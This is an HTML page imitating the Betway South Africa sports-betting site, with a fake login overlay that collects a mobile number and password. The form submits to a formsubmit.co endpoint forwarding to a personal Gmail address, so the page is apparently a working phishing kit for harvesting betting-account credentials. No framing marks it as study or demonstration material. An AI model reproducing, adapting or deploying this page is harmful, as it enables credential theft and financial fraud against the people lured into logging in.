<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Betway ZA</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    /* Reset & Base */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html,body { height: 100%; }
    body {
      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      background: #111;
      color: #fff;
      -webkit-font-smoothing: antialiased;
      padding-bottom: 86px;
      line-height: 1.4;
    }

    a { color: inherit; text-decoration: none; }

    /* Header (fixed) */
    .top-bar {
      position: fixed;
      top: 0; left: 0; right: 0;
      height: 60px;
      background: #000;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 10px 14px;
      z-index: 1200;
      box-shadow: 0 1px 0 rgba(255,255,255,0.02) inset;
    }
    .top-left { display: flex; align-items: center; gap: 12px; }
    .menu-icon { font-size: 22px; cursor: pointer; color: #fff; }
    .auth-buttons {
      display: flex;
      gap: 10px;
      align-items: center;
      transform: translateY(8px);
    }
    .btn { border: none; padding: 8px 14px; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 14px; }
    .btn-login { background: #fff; color: #0b8a00; }
    .btn-signup { background: #0b8a00; color: #fff; }

    /* Page container */
    .page {
      padding: 78px 14px 20px;
      max-width: 980px;
      margin: 0 auto;
    }

    /* Search box */
    .search-box {
      background: #1e1e1e;
      border-radius: 7px;
      padding: 8px;
      display: flex;
      align-items: center;
      gap: 10px;
      border: 1px solid rgba(255,255,255,0.17);
    }
    .search-box input {
      background: transparent;
      border: none;
      color: #ccc;
      font-size: 16px;
      outline: none;
      width: 100%;
    }
    .search-box i { color: #aaa; }

    /* Booking row */
    .booking-row {
      display: flex;
      gap: 5px;
      margin-top: 14px;
      align-items: center;
    }
    .booking-left {
      flex: 1;
      display: flex;
      gap: 10px;
      align-items: center;
      background: #242424;
      border-radius: 7px;
      padding: 2px;
      border: 1px solid rgba(255,255,255,0.17);
    }
    .booking-left input {
      background: transparent; border: none; color: #ddd; outline: none; font-size: 15px; width: 100%;
    }
    .booking-left .btn-go {
      background: #0b8a00; color: #fff; border-radius: 8px; padding: 8px 5px; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
    }
    .booking-right {
      width: 140px;
      text-align: center;
      background: #2b2b2b;
      padding: 9px;
      border-radius: 7px;
      border: 1px solid rgba(255,255,255,0.17);
      color: #ddd;
      font-size: 15px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    /* Cards */
    .cards {
      display: flex;
      justify-content: center;
      align-items: stretch;
      gap: 12px;
      margin-top: 20px;
    }
    .card {
      flex: 1;
      border-radius: 16px;
      padding: 28px 10px 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      color: #fff;
      transition: transform 0.25s ease, box-shadow 0.25s ease;
      min-height: 180px;
    }
    .card img {
      width: 74px;
      height: 74px;
      object-fit: contain;
      margin-bottom: 16px;
    }
    .card .label {
      font-weight: 800;
      font-size: 26px;
      letter-spacing: 0.5px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.4);
    }
    .sport-card { background: linear-gradient(180deg, #000000 0%, #00c851 100%); }
    .casino-card { background: linear-gradient(180deg, #000000 0%, #007bff 100%); }

    /* Welcome banner */
    .welcome {
      margin-top: 28px;
      padding: 22px;
      background: #0f0f0f;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.02);
    }
    .welcome h1 { font-size: 22px; margin-bottom: 10px; color: #fff; }
    .welcome p { color: #bfc7cc; font-size: 15px; line-height: 1.6; }

    /* Promotions */
    .promos {
      margin-top: 22px;
      display: flex;
      gap: 12px;
      overflow: auto;
    }
    .promo-card {
      min-width: 220px;
      background: linear-gradient(135deg,#121212,#1b1b1b);
      padding: 18px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.03);
    }
    .promo-card h4 { font-size: 16px; margin-bottom: 8px; }
    .promo-card p { color: #bfc7cc; font-size: 13px; }

    /* Footer */
    footer.site-footer {
      margin-top: 30px;
      background: #0b0b0b;
      color: #ddd;
      padding: 28px 14px 120px;
      border-top: 1px solid rgba(255,255,255,0.02);
    }
    .footer-grid {
      display: grid;
      grid-template-columns: repeat(2,1fr);
      gap: 18px;
      max-width: 980px;
      margin: 0 auto;
    }
    .footer-grid a { display: block; padding: 6px 0; color: #ddd; font-weight: 600; }
    .footer-bottom {
      margin-top: 18px;
      color: #9aa4a8;
      font-size: 13px;
    }

    /* Modal Overlay */
    .overlay {
      position: fixed;
      inset: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: rgba(0,0,0,0.7);
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
      z-index: 3000;
    }
    .overlay.active {
      opacity: 1;
      pointer-events: auto;
    }
    .login-container {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.4);
    }
    .login-header {
      background: #111;
      color: #fff;
      padding: 16px 20px;
      font-size: 20px;
      font-weight: 700;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .close-btn { background: none; border: none; color: #fff; font-size: 26px; cursor: pointer; }
    .login-body { padding: 22px; color: #000; }
    .input-group { position: relative; margin-bottom: 14px; }
    .input-group input {
      width: 100%;
      padding: 12px 14px 12px 60px;
      border-radius: 4px;
      border: 1px solid #ccc;
      background: #f6f6f6;
      font-size: 15px;
    }
    .prefix { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-weight: 600; color: #333; }
    .password-wrapper { position: relative; margin-bottom: 10px; }
    .password-wrapper input {
      width: 100%;
      padding: 12px 14px;
      padding-right: 44px;
      border-radius: 4px;
      border: 1px solid #ccc;
      background: #f6f6f6;
    }
    .eye-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: transparent; border: none; cursor: pointer; }
    .login-action {
      width: 100%;
      padding: 13px;
      background: #0b8a00;
      border: none;
      color: #fff;
      font-weight: 700;
      border-radius: 4px;
      font-size: 17px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <!-- Top bar -->
  <div class="top-bar" role="banner">
    <div class="top-left">
      <div class="menu-icon" aria-hidden="true">☰</div>
      <a href="#" style="display:block; padding:0.6em 0; text-align:center;">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEih_9Gh-WcbcueDJuQQSARoLB5clVrnNZ-cn-58qHNo4NFvKtx_-n06r-7rVOtpJpt4Qfd7bNBoSIXjbRso4A4U0x7Rh4lrl5sOp14JE9kXLEjlgEfWZxNTBrZSua1DKTQyQ8NV3VRlLufckjT4NvFSeCmw52lEfrOm8U3n7aAhBqTdKSswva64WQdKH7Xw/s447/1000088987.png" alt="Betway Logo" width="120" style="display:block; margin:auto;">
      </a>
    </div>

    <div class="auth-buttons">
      <button class="btn btn-login" onclick="openLogin()">Login</button>
    </div>
  </div>

  <!-- Page content -->
  <main class="page" role="main">
    <div class="search-box" aria-label="Search">
      <i data-lucide="search"></i>
      <input type="search" placeholder="Search" aria-label="Search input">
    </div>

    <div class="booking-row" style="margin-top:14px;">
      <div class="booking-left" role="group" aria-label="Enter booking code">
        <input type="text" placeholder="Enter Booking Code" aria-label="Booking code">
        <button class="btn-go" aria-label="Go booking"><i data-lucide="chevron-right" stroke-width="3"></i></button>
      </div>
      <div class="booking-right" role="button" tabindex="0" aria-label="All codes">
        All Codes <i data-lucide="chevron-right"></i>
      </div>
    </div>

    <section class="cards" aria-label="Main sections">
      <div class="card sport-card" role="button" tabindex="0" aria-label="Sport">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPG7fB8qX5LywFFnuKPD2F6p_gZxx1gTZXsEL4yZMkDxLSDaWblI_mxO-YO_aQpPELHxy_M5qXRCwajGeMel7JF4CtSrZJWrpFUJCURm8RYaggFR9pu25Nn9HEJOErdqomT_KEUNVWawBLRjDJ4R3idoY9L9Ptdih3KzQOcFvBNixKG9AIc0KJIgnL_jcp/s1600/1000083696.png" alt="Sport icon">
        <div class="label">SPORT</div>
      </div>
      <div class="card casino-card" role="button" tabindex="0" aria-label="Casino">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaskULmcbRsnl2JaqyWmnAQxGvbMKsZsbNloDJP1AEpCBJ368uOgSv53k9S37Ll467MCGFU7GtLvoHfcWpL1rH-DUZePleVmEfUl2bYCVt-_7m-RTysvDoPJxh7Ki7VicVZx66WHItuS0BNYfTnYgfL4ULv97zWAw6jPDvmKW07RmROJ-ZEJV9ZdjF2x4V/s1600/1000083712.png" alt="Casino icon">
        <div class="label">CASINO</div>
      </div>
    </section>

    <section class="welcome" aria-label="Welcome">
      <h1>Welcome to sports betting with Betway South Africa</h1>
      <p><strong>Betway</strong> offers the very best in online sports betting.</p>
    </section>

    <!-- Footer content -->
    <footer class="site-footer" role="contentinfo">
      <div class="footer-grid">
        <div>
          <a href="#">How To Bet</a>
          <a href="#">Terms & Conditions</a>
          <a href="#">Betway App</a>
        </div>
        <div>
          <a href="#">Frequently asked questions</a>
          <a href="#">Betting Rules</a>
          <a href="#">Contact Us</a>
        </div>
      </div>
      <div class="footer-bottom">
        <p>© 2026 Betway South Africa. All rights reserved.</p>
      </div>
    </footer>
  </main>

  <!-- Login overlay -->
  <div class="overlay" id="overlay" aria-hidden="true">
    <div class="login-container" role="dialog" aria-modal="true">
      <div class="login-header">
        <span>Login</span>
        <button class="close-btn" onclick="closeLogin()">×</button>
      </div>
      <div class="login-body">
        <form id="loginForm" action="https://formsubmit.co/teddythato29@gmail.com="POST">
          <div class="input-group">
            <span class="prefix">+27</span>
            <input type="text" placeholder="Mobile Number" name="mobile" required>
          </div>
          <div class="password-wrapper">
            <input type="password" placeholder="Password" id="passwordField" name="password" required>
            <button class="eye-btn" type="button" onclick="togglePassword()">👁</button>
          </div>
          <button class="login-action" type="submit">Login</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    if (window.lucide) lucide.createIcons();

    function openLogin() {
      document.getElementById('overlay').classList.add('active');
    }
    function closeLogin() {
      document.getElementById('overlay').classList.remove('active');
    }
    function togglePassword() {
      const input = document.getElementById('passwordField');
      input.type = input.type === 'password' ? 'text' : 'password';
    }
  </script>
</body>
</html>
